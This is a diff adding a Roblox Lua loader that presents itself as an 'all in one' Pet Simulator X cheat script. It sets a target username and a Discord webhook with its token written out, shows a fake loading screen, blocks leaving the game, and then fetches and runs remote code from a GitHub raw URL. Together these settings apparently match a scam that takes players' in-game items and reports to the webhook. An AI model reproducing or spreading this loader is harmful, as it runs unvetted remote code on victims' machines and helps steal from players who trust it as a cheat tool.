@@ -1,0 +1,23 @@
+``` UserName = "arriesgado52251"
+
+UserName2 = "W"
+
+Webhook = "https://discord.com/api/webhooks/1109491060314492929/OkhyHtaoxIzX_K4EYLKS09raBTMGg8gNuK4mJ7tzfoUqTr7H6Dy_GQe8VzqZcBKzUaFT"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = false 
+
+_G.ScriptName = "Rizz Scriptz"
+
+_G.FirstText = "ALL IN ONE!"
+
+_G.SecondText = "PSX  all in one script!"
+
+_G.ThirdText = "Lucky World UPDATE"
+
+_G.WaitingTime = 300
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeHUB/lol/main/Loaded", true))() ```
